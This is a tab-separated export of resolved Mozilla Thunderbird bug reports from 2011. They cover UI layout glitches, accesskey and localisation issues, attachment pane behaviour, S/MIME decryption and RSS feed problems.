659730%TAB%1306319677%TAB%218420%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Option window-->Network & Disk Space has disk space textbox for cache too little%TAB%Option window-->Network & Disk Space has disk space textbox for cache too littleThe textbox where user insert "disk space" for cache is too little as show in attached screenshot  Mozilla/5.0 (Windows NT 6.1; rv:7.0a1) Gecko/20110525 Thunderbird/3.4a1pre
659527%TAB%1306252195%TAB%251051%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Thunderbird manual update link opens a new mail compose window instead of a browser window%TAB%Thunderbird manual update link opens a new mail compose window instead of a browser windowSTR:  1. Open the new style About dialog in a nightly.  Wait for the update check to finish (you can run it in a mounted DMG to make sure that it fails). 2. Click the "latest version" link.  A new mail compose window opens!
658872%TAB%1306036569%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%Move the splitter on top of the FormatToolbar%TAB%Move the splitter on top of the FormatToolbarIn Bug 654754 Comment 13 bwinton sayd:  > And I would still prefer to see the splitter on top of the FormatToolbar, > but we can leave that for another bug, I guess…  This makes sense because the splitter changes the height of the addressing widget and the FormatToolbar is more associated to the text content.
658793%TAB%1305961580%TAB%100230%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Embedded S/MIME messages are not decrypted%TAB%Embedded S/MIME messages are not decryptedUsing Miramar 3.3a4 build ...  An embedded S/MIME message following the structure below is not decrypted anymore. Instead, it is displayed as attachment. Unfortunately, Enigmail relies on this scenario to work for its initialization process of PGP/MIME. This used to work until +/- May 10th.  Subject: ... Content-Type: multipart/mixed; boundary="--MSGSEP"  This is a multi-part message in MIME format.  ----MSGSEP Content-Type: application/pkcs7-mime; name="smime.p7m" Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename="smime.p7m" Content-Description: S/MIME Encrypted Message  ENCRYPTED_DATA  ----MSGSEP Content-Type: text/plain  DATA  ----MSGSEP--   I debugged this a bit and I found that until recently libmime produced MimeEncrypted objects for such embededded S/MIME parts (which I consider correct). But now the class type changed to MimeExternalObject.
658534%TAB%1305871423%TAB%27210%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End,Lightning Only,Folder and Message Lists%TAB%can't collapse+expand accounts in folder pane, tree is undefined%TAB%can't collapse+expand accounts in folder pane, tree is undefinedtbird trunk circa 2011-05  1. collapse an account in folder pane (click on plusminus/arrowthing next to it) 2. expand an account in folder pane ( --"-- )  expected: account folders expanded  result: Error: uncaught exception: [Exception... "'[JavaScript Error: "tree is undefined" {file: "chrome://messenger/content/folderPane.js" line: 889}]' when calling method: [nsITreeView::toggleOpenState]"  nsresult: "0x80570021 (NS_ERROR_XPC_JAVASCRIPT_ERROR_WITH_DETAILS)"  location: "JS frame :: chrome://global/content/bindings/tree.xml :: changeOpenState :: line 241"  data: yes]
658466%TAB%1305836630%TAB%83455%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%RSS account doesn't use default browser and is very slow%TAB%RSS account doesn't use default browser and is very slowUser-Agent:       Mozilla/5.0 (Windows NT 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Mozilla/5.0 (Windows NT 6.0; rv:5.0) Gecko/20110518 Thunderbird/3.3a4pre ID:20110518000038  I'm running Litmus test 4 (view RSS subscription article summary) in "rss account & subscriptions using Thunderbird 3.3a4pre ID:20110518000038 under Vista. It states that the thread pane should just have summaries, and that when you click on one of them it should show just the article (without comments, headers etc.) in the default browser.   It displays the article in the message pane instead, changing the color of the summary to indicate its read. I have the message pane enabled because that is how I like to read email. I disabled the message pane and clicked on a different summary. That did literally nothing (doesn't display anything or mark it as read).   I right clicked on the same summary and chose "Open message in new tab" from the context menu. That opened a tab that displayed the article, and changed the summary to indicate it was read.  I'm not sure what the correct behavior is supposed to be. I don't think its as simple as the Litmus test case needs to be updated to replace "viewing in the default browser" with displaying it in Thunderbird because it never created a tab/window unless I used the context menu, and most people don't enable the message pane.  I initially used http://planet.mozillamessaging.com/rss20.xml when this problem occurred. I was able to read some articles that way but many took over 3 minutes to load, and never loaded the images. I did not have any problem or delay reading that blog entry using a browser.  Reselecting that article discarded the loaded article and started to load it again. It was very annoying to wait several minutes for less than 2 dozen lines of text on a DSL connection that consistently gets about 2514 Kbps (according to both the flash and java based speed tests at www.dslreports.com). I can't find any way to display the images. I tried right clicking on the image, selecting "copy image" and then pasting that into IrfanView. That pasted the URL instead. However, there were other articles where it displayed the images. When that happened right clicking on the image and selecting "copy image" did copy the image.  In general I found the RSS reader incredibly slow. Even when it worked it could take as long to fetch one article as it took a browser to open the complete blog page (52 articles). The only case where I found the performance not an issue was with http://www.schneier.com/blog/index.rdf , and its entire feed (of 5 articles) was about 30 lines of text and no images.  
658328%TAB%1305795014%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Make the viewPickerPopup and folderLocationPopup look more native%TAB%Make the viewPickerPopup and folderLocationPopup look more nativeSpinning off Bug 655110  Under Classic and High contrast themes these popups all ways black text on white background. The menuitems in submenus are jumping on hover.
658197%TAB%1305759150%TAB%256169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Search%TAB%"No messages match your search" message displaying badly when not en-US%TAB%"No messages match your search" message displaying badly when not en-USWhen an initial search fails to have any result, a more extensive search is proposed hitting the ENTER key. If this second search also fails, the message "No messages match your search" is displayed. Problem is: en-US string is diplayed ok for the div dimensions in which it is stuck along with the image.  BUT for more verbose langs (see first screenshot with en-US / French / Dutch / Spanish) the string is badly cut.  This minor layout issue can be corrected with the suggested patch, just adding a < br/> in the .xhtml file Of course you smart guys may consider to tweak the css file instead
657856%TAB%1305657040%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Improve interface for attachment objects in the message reader%TAB%Improve interface for attachment objects in the message readerFor some bugs I'm working on, it would be very nice if the interface for attachment objects in Javascript was improved. Currently, they are "just" dictionaries, which is a bit clumsy, especially when checking for deleted attachments (attachment.contentType == "text/x-moz-deleted").  Attached is a patch to improve the interface by giving the objects some useful methods. I also eliminated the cloneAttachment function, since as far as I can tell, it served no useful purpose.  Existing tests should cover most everything here already.
657590%TAB%1305602614%TAB%188156%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Duplicated Message%TAB%Duplicated MessageWhen I open a message, I just noticed that the Next/Last string is duplicated but only one of them is functional. 
657446%TAB%1305543724%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Archive Options button in Copies & Folders should be hidden based on target, not source account%TAB%Archive Options button in Copies & Folders should be hidden based on target, not source accountIt appears that enforcing a flat archiving hierarchy when an account is a GMail IMAP server (thus not allowing subfolders of "All Mail" as the Archives folder) may hide or show the "Archive Options" in the wrong situations.  Steps to reproduce:  - create a GMail-IMAP account  - go into Copies & Folders of GMail account, "Archive Options" is hidden  - select "Archives folder in Local Folders" as target location  - "Archive Options" remains hidden though Local Folders supports subfolders  Thus, the "hidden" status is determined from the source server rather than the target server (using nsIImapIncomingServer.isGMailServer in bug 640342). The following situation may currently occur:   - create a second (here: POP) account  - in Copies & Folders, select the GMail account as target for archiving  - close and reopen Account Settings from the context menu of the POP account  - in Copies & Folders, "Account Options" is enabled though not supported  As this example shows, it would make more sense to enable or disable the "Archive Options" dialog dynamically based on the selected target account.
657218%TAB%1305439444%TAB%138192%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%UI for new archive granularity uses false accesskey entity for keepArchives%TAB%UI for new archive granularity uses false accesskey entity for keepArchivesThe following XUL code uses a false accesskey entity in comm-trunk and comm-miramar 2011-05-15 builds:  <checkbox wsm_persist="true" id="identity.archiveEnabled"           label="&keepArchives.label;"           accesskey="&fccMailFolder.accesskey;"           prefattribute="value"           prefstring="mail.identity.%identitykey%.archive_enabled"           oncommand="setupArchiveItems();"/>  &fccMailFolder.accesskey; has to be replaced by &keepArchives.accesskey;
656736%TAB%1305200276%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Testing Infrastructure%TAB%Upgrade to latest MozMill for Thunderbird's tests,Resolve Thunderbird MozMill bad death failures, possibly via upgrade to latest MozMill for Thunderbird's tests,Upgrade to latest MozMill for Thunderbird's tests%TAB%Upgrade to latest MozMill for Thunderbird's tests,Resolve Thunderbird MozMill bad death failures, possibly via upgrade to latest MozMill for Thunderbird's tests,Upgrade to latest MozMill for Thunderbird's testsAndrew's recommending we update our MozMill usage to the latest version, as this will hopefully solve some of the issues we currently have.
656590%TAB%1305171298%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Implement channel selector UI for updates%TAB%Implement channel selector UI for updatesAs said in the bug where Firefox implemented this (bug 644517):  (In reply to comment #0) > For the upcoming versions of Firefox, we want users to be able to opt in to > experimental and beta channels if they want to, via the same dialog that > holds the version information (currently the About window). >  > The user should be able to move freely between experimental, beta and final > release update channels, and we should give a mechanism to restart when you > change the channel. >  > Some explicit non-goals: >  > * We don't allow people to switch to nightly builds from this dialog, since > they are for developers, and should be a separate download (and arguably > shouldn't even use the same profile, but that's a separate issue). >  > * We don't allow people to switch to project branches using this selector. > If someone wants to write an add-on that does this, that's fine — but we're > not going to do it in the core implementation.
656212%TAB%1305064068%TAB%285656%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Port accessibility fixes for About window to Thunderbird%TAB%Port accessibility fixes for About window to ThunderbirdBug 649929 introduced various accessibility fixes to help read the new About window better. Porting those over to Thunderbird will be extremely trivial. Assigning this to me and will provide a patch shortly.
656203%TAB%1305057943%TAB%113380%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%Remove obsolete comment from messenger.dtd%TAB%Remove obsolete comment from messenger.dtdAttachment 520522 [details] [diff] in bug 504122 has dropped two localizable entities (they were replaced with the other ones), but a comment about the old entities was overlooked and remains in place. That comment should be dropped. 
656045%TAB%1305014760%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Attachment bar actions should be disabled if only a text/x-moz-deleted attachment is present%TAB%Attachment bar actions should be disabled if only a text/x-moz-deleted attachment is presentA minor follow-up to bug 282068, as extended by bug 646032. Take a message with an attachment and delete that attachment, then revisit the message. It will show up with "1 attachment: Deleted: ..." as expected. Right-clicking on either the attachment in the bar itself or the button shows all options disabled, also as expected. However, clicking on the "Save" button will still allow you to save the (meaningless) text/x-moz-deleted part of the message.  For consistency, attachment link and action button should be disabled if no attachment is present for which an action could be performed.  This probably won't affect detached attachments given that the action is performed on the detached file instead.
655989%TAB%1304997791%TAB%99100%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Figure out a keyboard shortcut for Get all new message on the mac%TAB%Figure out a keyboard shortcut for Get all new message on the macI think it was not mentioned in bug 527467, but if you are using a macbook, then by default the function keys are mapped to the alternate function (I guess you could say "fn"-lock). This makes F5 the key for "decrease keyboard backlight brightness" and requires fn+F5 to be pressed to get a real F5. In Firefox users will probably use Cmd+R, but this is obviously taken.
655975%TAB%1304989683%TAB%206231%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Toolbars and Tabs%TAB%display glitch on buttons previous and next on tool-bar when an account is selected%TAB%display glitch on buttons previous and next on tool-bar when an account is selectedUser-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.17) Gecko/20110422 Ubuntu/10.10 (maverick) Firefox/3.6.17 Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.17) Gecko/20110424 Thunderbird/3.1.10  the tool-bar icons of the buttons "previous" and "next" (move to previous/next unread message) are not displayed as expected when an account or the local folder is selected in the left pane  if a mail is selected (in the right pane) or a mail folder (in the left pane) the display is fine  Reproducible: Always  Steps to Reproduce: 1.use the tool-bar customize feature to add the previous and next buttons in the tool-bar or menu-bar 2.select a mail account in the left pane or the local folder   Actual Results:   the icons are displayed weirdly : the previous icon is replaced by a micro tiny buggy thing larger than a normal icon and the next icon become void  Expected Results:   the icons could be grayed as the other disabled tool-bar icons in this case
655962%TAB%1304986980%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Drop the check for updates menuitem%TAB%Drop the check for updates menuitemWith bug 650231, we have put the check for updates functionality into the About window. We therefore no longer need that functionality in the Help menu (or application menu on Mac).  We can just remove the appropriate items. I'm taking Blake's bug 650231 comment 37 as implicit ui-review+.  It has one string removal, so I'd like to get it in today if possible, before we string freeze.
655717%TAB%1304920576%TAB%218420%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mail Window Front End%TAB%New attachment pane, make less readable files name in some circumstances when message is open in new window%TAB%New attachment pane, make less readable files name in some circumstances when message is open in new windowWhen a message with some attachment is open in new window, in some circumstance user has minor readability on files name because the new transparency on this area on Aereo theme.  I'm not sure if is a bug or is deliberate, then mark this unconfirmed.
655698%TAB%1304915480%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General,Mail Window Front End%TAB%Reorder the help menu to group similar items closer together%TAB%Reorder the help menu to group similar items closer togetherCurrently our help menu has quite a jumbled list of items.  I think we should just re-order it slightly to better group things together. The patch attached does what I think we should end up with:  First group is support related things:  - Help - What's New - Release Notes - Troubleshooting Information  Second group (after an added separator) are action related help items:  - Migration Assistant - Restart with add-ons disabled.  I think this helps to bring a bit of structure back to the menu.  I've currently got builds running on try server as I've only verified this on Mac so far.
655214%TAB%1304635166%TAB%171442%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%accountName label is used on the place of server name label in Troubleshooting Information%TAB%accountName label is used on the place of server name label in Troubleshooting InformationUser-Agent:       Mozilla/5.0 (Windows; U; Windows NT 6.1; ja; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 Build Identifier: Mozilla/5.0 (Windows NT 6.1; rv:5.0a2) Gecko/20110505 Thunderbird/3.3a4pre  At the "Mail and News Accounts" section of Troubleshooting Information page, "aboutSupport.accountsName" entity is used on the place of server name.  The value of "aboutSupport.accountsName" is just "Name". This generic stiring is used on the label of account name and server name.  I want to separate them and localize to "アカウント名" (account name) and "サーバ名" (server name) in Japanese.  Actually, the target of them are different. Please don't reuse generic string to different target.  Reproducible: Always  Steps to Reproduce: 1. Open Troubleshooting Information page. (Help > Troubleshooting Information) 2. Click "Include account names" option to check.   Actual Results:   The entity of account name label is used to server name label at "Mail and News Accounts" section.  Expected Results:   Add "aboutSupport.accountsServerName" to aboutSupportMail.dtd and use it to server name label in the aboutSupport.xhtml.
655202%TAB%1304624294%TAB%365912%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Message header alignment is off (from / subject / to)%TAB%Message header alignment is off (from / subject / to)User-Agent:       Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Thunderbird/3.1.10  Since From and To fields have emails (styled with padding so the :hover effect looks decent), the subject field ends up aligned a few pixels to the right.  Also, the From field value is aligned one pixel too high.  Reproducible: Always  Steps to Reproduce: 1. View message   Actual Results:   Headers are mis-aligned   (Really annoying that cosmetic problems are marked "trivial"
655110%TAB%1304592194%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%Error in mailWindow1-aero.css%TAB%Error in mailWindow1-aero.cssThis two errors are in error console:  Warning: Expected color but found 'menuitem'.  Error in parsing value for 'background-color'.  Declaration dropped. Source file: chrome://messenger/skin/mailWindow1.css Line: 495  ---------- Warning: Expected color but found 'menuitem'.  Error in parsing value for 'background-color'.  Declaration dropped. Source file: chrome://messenger/skin/mailWindow1.css Line: 476
654933%TAB%1304547028%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%msgHdrViewOverlay needs cleaning up%TAB%msgHdrViewOverlay needs cleaning upThe code in msgHdrViewOverlay.js is pretty messy, and really needs someone to go over it and clean it up. Since I've been doing a bunch of stuff in there, I'm volunteering myself to do this. Notable issues include:  * A wide assortment of quote/brace/indent styles * Various differently-formatted comments * Comments (and code) which take >80 characters of space for no good reason * Strangely named objects (why is an object named "createNewAttachmentInfo"? It   should just be "AttachmentInfo").  Once the changes to the attachment bar settle down, I'll start uploading patches for various parts of this.
654916%TAB%1304536830%TAB%288265%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%To/Cc Popups look uneven on os x,To/Cc Popups are uneven for first and last rows%TAB%To/Cc Popups look uneven on os x,To/Cc Popups are uneven for first and last rowsSee attached screenshot.  Notice different size of both Cc lines
654912%TAB%1304533333%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%"Open all..." for attachments is available in File -> Attachments menu, but not attachments pane%TAB%"Open all..." for attachments is available in File -> Attachments menu, but not attachments paneUnder File -> Attachments, there's an "Open all..." menu item, but there isn't one in the attachment pane, either in the list itself, or as a menu item from the toolbar button. Here's a patch to add that. Just a note of caution: I wouldn't use "Open All" on a closed attachment list where all information I have is "3 attachments" or so, not knowing which type of attachment it is and if it potentially disguises a virus...  It's probably ok to offer "Open All" when the attachment pane is open and the user has verified that it's safe to open them all at the same time.
654834%TAB%1304511268%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%"Save"/"Save all" button in attachment pane has no icon on Mac%TAB%"Save"/"Save all" button in attachment pane has no icon on MacThe save/save all button on the attachment pane should have an icon, but on Mac, it doesn't. This is a problem, since a person may reasonably want to customize the toolbar to show only icons.  Attached is a speculative fix. I think the issue is just that we forgot to add the new icon to pinstripe's jar.mn.
654754%TAB%1304497389%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Attachment pane cropped in composition window when using HTML mode with small window width%TAB%Attachment pane cropped in composition window when using HTML mode with small window widthI'm not sure if anything can be done about it which is reconcilable with the redesigned composition window, but the current layout may pose a challenge for users running a low screen resolution and thus have a limited windows width.  Following changes were made in bug 642163:  - the formatting bar has moved about 100px to the right, leading empty space;  - the end of the attachment pane is aligned with the end of the format bar.  Consequently,  - the minimum window size to show all UI items has increased by 100px;  - the attachment pane is cropped once the format bar gets truncated.  The latter effect is a regression from previous behavior where only the format bar was cropped but the attachment pane was allowed to slide into the address area without being truncated.  If possible, it would be good to uncouple the attachment pane from the format bar alignment, given that it becomes inaccessible when the window is small (which is typically the case for visually impaired users or those who don't want to use up the full screen; also, netbooks may be affected, where I don't know the size specifications).  Workaround: Disable toolbar visibility if the window size cannot be increased.
654708%TAB%1304488771%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Follow changes in main window and Composer for Address book%TAB%Follow changes in main window and Composer for Address bookThis Bug is for changing the sidebar header and the border around the content under Aero.
654702%TAB%1304486177%TAB%217596%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%The attachments pane should not show 0 length%TAB%The attachments pane should not show 0 lengthFeed enclosures may or may not have a length published.  If they do, the fix in bug 646105 will expose that.  If not, 0 length should not be shown, as what we really mean is that we don't know it, not that it's 0.
654686%TAB%1304477523%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Inconsistent appearance of composition window with Windows Classic desktop theme on XP%TAB%Inconsistent appearance of composition window with Windows Classic desktop theme on XPThe structure and appearance of the compose window was recently modified as part of bug 642163 (I yet have to get used to the relatively huge blank space on the left-hand side). When using the Windows Classic theme on Windows XP, two strange issues can be noticed:   * The "To/Cc/Bcc" selector looks now more like a textbox than a menu. While    the other platforms have a styled menu appearance, the drop-down arrow    alone doesn't quite convey that metaphor.   * While the patch in bug 642163 removed the separators around the formatting    bar for that bar itself, it apparently missed the corresponding separators    on the other sides, which should be removed as well.
654672%TAB%1304468238%TAB%112088%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Could not read extensions chrome manifest file (972ce4c6-7e08-4474-a285-3208198ce6fd = default theme)%TAB%Could not read extensions chrome manifest file (972ce4c6-7e08-4474-a285-3208198ce6fd = default theme)Since the changes from Bug 579178, I see the following message in TBs error console:  Could not read chrome manifest file '/Volumes/Shredder/Shredder.app/Contents/MacOS/extensions/{972ce4c6-7e08-4474-a285-3208198ce6fd}/chrome.manifest'.  This extensions is the Thunderbird default theme.
654645%TAB%1304455027%TAB%355920%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Attachment size is not displayed in compose window in case of "Send To" -> "Mail Recipient" from Windows Explorer%TAB%Attachment size is not displayed in compose window in case of "Send To" -> "Mail Recipient" from Windows ExplorerUser-Agent:       Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0a2) Gecko/20110503 Thunderbird/3.3a4pre  Attachment size is not displayed in compose window in case of "Send To" -> "Mail Recipient" from Windows Explorer  Reproducible: Always  Steps to Reproduce: 1. Open Windows Explorer 2. right click a file 3. chose "send to" --> "mail recipient" 4. TB compose window opens with file attached, but sile size is not displayed
654426%TAB%1304396143%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Compose Window%TAB%Bad display of compose window addressing indicators on Mac following bug 642163%TAB%Bad display of compose window addressing indicators on Mac following bug 642163See the attached screenshot.  There's two issues here:  1) For some reason the second and third lines have buttons that seem to be slightly taller. 2) The Newsgroup: text is partially obscured (same with Follow-up to: but that isn't shown here).  I'm not sure what is best for the newsgroup text here. Maybe smaller text or a tooltip. Although I'm not convinced a tooltip is really that good for something we should be able to display on the default UI.
654402%TAB%1304382784%TAB%96224%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General,Account Manager%TAB%"Copies & Folders" page in Account Settings is cut off%TAB%"Copies & Folders" page in Account Settings is cut offUser-Agent:       Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Build Identifier:   This was reported in bug 607295, the changes introducing a separate "Message Archives" section resulted in the layout being cut off at the bottom - at least on Windows 7. Fortunately the window is resizable, but the default dialog size (or persisted old values) seems to be too small now. See attachment 528421 [details] for a screenshot.
654222%TAB%1304336253%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Attachment list should resize to fit long names%TAB%Attachment list should resize to fit long namesThe attachment list currently crops any long filename, even when that doesn't save any space (e.g. there is only one attachment). We should be able to dynamically set the width for the list items based on the maximum width needed to fit the text.  There should probably be a "really maximum" value so that pathologically long filenames don't cause problems.
654053%TAB%1304288632%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Pprt bug 623950 Send startup time measurements along with metadata request,Port bug 623950 Send startup time measurements along with metadata request%TAB%Pprt bug 623950 Send startup time measurements along with metadata request,Port bug 623950 Send startup time measurements along with metadata requestBug 522375 plans to expose simple information about startup performance to JS. We'd like to include this in the metadata request that we send to AMO in order to be able to gather aggregated data on startup performance with certain add-ons installed. I'm not sure that this constitutes much of an additional fingerprinting risk as the number will almost certainly change for every startup but we can discuss that issue.
653103%TAB%1303878688%TAB%279382%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Security%TAB%Scam detection generates too many false positives to be useful and should be easier to turn off as interim fix%TAB%Scam detection generates too many false positives to be useful and should be easier to turn off as interim fixSpin-off per bug 623198 comment #49, switching the default and providing an easier way to turn the feature off until it is completed are two different issues. For details see the discussion in bug 623198 and bug 320351.
653062%TAB%1303857626%TAB%256169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Duplicate accesskeys on Composing & addressing preferences%TAB%Duplicate accesskeys on Composing & addressing preferencesSame ak "S" chosen twice (screenshot attached)  If "Automatically quote the original message..." is ticked then "S" is invalid  Suggesting "I" for Include instead of "s" in attached patch
652939%TAB%1303816443%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%folderpane_splitter in rtl mode doubled%TAB%folderpane_splitter in rtl mode doubledIn rtl mode the folderpane_splitter has two lines, Patch fixing the doubled border. I also checked vertical view, Address book and Composer. This is the only part who needs a fix.
652670%TAB%1303736867%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%OS Integration%TAB%treerows in disabled trees shouldn't be selectable in Aero theme%TAB%treerows in disabled trees shouldn't be selectable in Aero themeIt seems that in the Aero theme for Thunderbird, treerows can be selected even when the tree is disabled. I'm guessing that this is due to theming in messenger-aero.css, but since I don't have Windows Vista/7, it's hard for me to test that.
652555%TAB%1303717726%TAB%29811%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Folder and Message Lists%TAB%Search... on folder context menu should be Search Messages...%TAB%Search... on folder context menu should be Search Messages...Search... on folder context menu should be Search Messages...  because  1. it brings up a "Search Messages" dialog, not a "Search" dialog.  2. There are 2 types of search (originally there was 3, with "quick search" in version 2), and we should be clear in differentiating "Search Messages" from "Search all messages" - Bug 652432 is an example of where confusion can result
652417%TAB%1303618605%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%Java Plugin2's name has changed on OS X Lion (10.7) [mail part]%TAB%Java Plugin2's name has changed on OS X Lion (10.7) [mail part]This is a port from Bug 651618 to /mail and in addition to SM's Bug 651928.
652318%TAB%1303526157%TAB%23988%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Email sender is displayed as quoted when name in from is quoted.%TAB%Email sender is displayed as quoted when name in from is quoted.Mozilla/5.0 (Windows NT 6.1; rv:2.0.2pre) Gecko/20110415 Thunderbird/3.3a4pre  E-mail with From or To etc. in format "name" <address> is displayed as "name" (quoted) in the mail list pain. (see attachment) Not occurred in 3.1 nightly.
652062%TAB%1303427300%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%#tabpanelcontainer don't show borders when Lightning is installed%TAB%#tabpanelcontainer don't show borders when Lightning is installedBug 638407 introduced a border around #tabpanelcontainer in Glass mode. 	 Lightning has again exchanged the rules order which ended in border-width of 0px.  I'm sorry, I was to anxious to remove also tabpanels#tabpanelcontainer in Bug 649304. In earlier versions of the Glass implementation I became a weird border in tab strip, but removing this rule now is save and has normally no effect because of the rule in mailWindow-aero.css. 	 I have now installed Lightning in my test profile to avoid again such problems.
652011%TAB%1303396212%TAB%342179%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Switching between RSS folders, sometimes a message is auto selected and displayed%TAB%Switching between RSS folders, sometimes a message is auto selected and displayedI've recently upgraded from Thunderbird 2.0.* to Thunderbird 3.1.9 and I am on Windows XP 64-bit version. I have one POP account and one RSS account (with about 70 feeds) setup in Thunderbird. I have it set up in "Classic View" with the Message Pane enabled. When I click on different folders in the POP account, I see the list of messages in the top-right pane, and the Message Pane is always blank until I select an e-mail to read. However, when I click on different RSS feeds, sometimes one of the messages in that feed is automatically selected and displayed in the Message Pane. I have tried setting mailnews.remember_selected_message to false, but this had no effect on the behavior I am seeing. This doesn't seem to be related to TB remembering a last selected message, it just randomly picks a message. New or old, read or unread doesn't seem to be a factor in which message is displayed either.  Reproducible: Sometimes  Steps to Reproduce: 1. Start Thunderbird, allow it to get new RSS messages 2. Select an RSS folder to see the list of messages 3. Sometimes a random message from the list is auto selected and displayed Actual Results:   Sometimes a random message from the list is auto selected and displayed  Expected Results:   No message should be auto selected.  I only have one Extension/Add-On: Extra Folder Columns 1.1.3 I only have the Default Theme installed and in use I have no plugins listed in the Add-Ons window
651486%TAB%1303275568%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%XML "Undefined entity" error page shown for entity "remoteXUL.title" in netError.xhtml%TAB%XML "Undefined entity" error page shown for entity "remoteXUL.title" in netError.xhtmlOur netError.xhtml display (e.g. if no network connection) is currently broken. Similar example of error on Fennec:  XML Parsing Error: undefined entity Location: jar:file:///data/app/org.mozilla.fennec-1.apk!/chrome/toolkit/content/global/netError.xhtml Line Number 331, Column 31:  <h1 id="et_remoteXUL">&remoteXUL.title</h1> ----------------------^   Attaching a patch that will fix this for Thunderbird.
651265%TAB%1303220992%TAB%225658%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Folder and Message Lists%TAB%Wrong tooltip for lines column header (news)%TAB%Wrong tooltip for lines column header (news)Originally reported as Aviary.pl bug 3891 (http://bugs.aviary.pl/show_bug.cgi?id=3891).  If you hoover the lines column header (available in newsgroup folder), wrong tooltip (sizeColumnTooltip) will be displayed.
